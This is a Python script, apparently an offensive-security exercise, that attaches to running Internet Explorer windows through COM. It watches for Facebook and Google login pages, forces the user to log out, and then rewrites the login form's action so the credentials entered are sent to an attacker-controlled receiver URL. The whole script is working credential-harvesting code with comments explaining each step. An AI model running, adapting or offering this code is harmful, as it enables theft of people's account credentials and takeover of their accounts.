import win32com.client
import time
from urllib.parse import urlparse ,quote



def wait_for_browser(browser) :                                     #waiting for the DOM to fully load before allowing the rest of our script to keep executing
    #wait for browser to finish loading page
    print(browser)
    while browser.ReadyState != 4 and browser.ReadyState != "complete" :
        time.sleep(1)
        print("[+] sleep end")
    return

#To recieve credentials from the target website
data_reciever   =   "http://127.0.0.1:8080"                         #change the port number 8080 if any issue arises due to port issues

''' Dictionary of sites that are supported by this script 
    ##EXTENDABLE##
    DICTIONARY-MEMBERS :
        - logout_url   : URL we can redirect via a GET request to force user to logout
        - logout_form  : is a DOM element that we can submit that forces logout 
        - login_form_index : is the relative location in the target domain's DOM that contains the login form which we will modify
        - owned : flag that tells us if we have already captured credentials from a target site to avoid repitition
        ##DOM is Document Object model which is platform independent and treats the XML or HTML docs as a tree structure##
'''
target_site = {}
target_site["m.facebook.com"] = {
                            "logout_url"       : "https://m.facebook.com/logout.php?h=AfeoYOyKEYoBW_OqzUM&t=1613898639&source=mtouch_logout_button&persist_locale=1&button_name=logout&button_location=settings" ,
                            "logout_form"      : "logout_form" ,
                            "login_form_index" : 0,
                            "owned"            : False
                            }
target_site["accounts.google.com"] = {
                            "logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail" ,
                            "logout_form"      : None ,
                            "login_form_index" : 0,
                            "owned"            : False
}
target_site["www.gmail.com"] = target_site["accounts.google.com"]
target_site["myaccount.google.com"] = target_site["accounts.google.com"]
clsid   =   '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'                #Internet Explorer classID

'''
    using ClassId of internet explorer and instantiate the CMo object which gives us access to all tabs and instances of Internet explorer that are currently running
    ##COM is Component Object model allows inter process communication##
'''
WINDOWS =   win32com.client.Dispatch(clsid)

#MAIN LOOP
while True :
    '''
    Iterating through all currently running internet explorer objects includes active tabs
    If user is already visiting one of the sites in our dictionary then  will start executing the main logic
    '''
    print("[+] Inside loop")
    for browser in WINDOWS :
        url =   urlparse(browser.LocationUrl)
        if url.hostname in target_site :
            if target_site[url.hostname]["owned"] :                 #check wheather attack has already been performed against this site if not proceed to execute script else skip this site
                continue

            if target_site[url.hostname]["logout_url"]:             #check if the site has the simplified logout url and if so force the browser to logout
                browser.Navigate(target_site[url.hostname]["logout_url"])
                wait_for_browser(browser)
        else :
            #retireve all elements in the docs
            full_doc    =   browser.Document.all                   #if the target site like facebook requires the user to submit the form to force the logout ,begin iterating over DOM and look for HTMl element id registered in dictionary for key logout_form

            #iterate ,looking for the logout form
            for i in full_doc :
                try :
                    #find the logout  form and submit it
                    if i.id == target_site[url.hostname]["logout_form"] :
                        i.submit()
                        wait_for_browser(browser)

                except :
                    pass
        #now we modify the login form
        try :
            login_index = target_site[url.hostname]["login_form_index"]
            login_page  = quote(browser.LocationUrl)
            print(login_page)
            browser.Document.forms[login_index].action  =   "%s%s" % (data_reciever ,login_page)        #wait for user to perform login
            print(browser.Document.forms[login_index].action)
            target_site[url.hostname]["owned"] = True
        except :
            pass
    time.sleep(5)

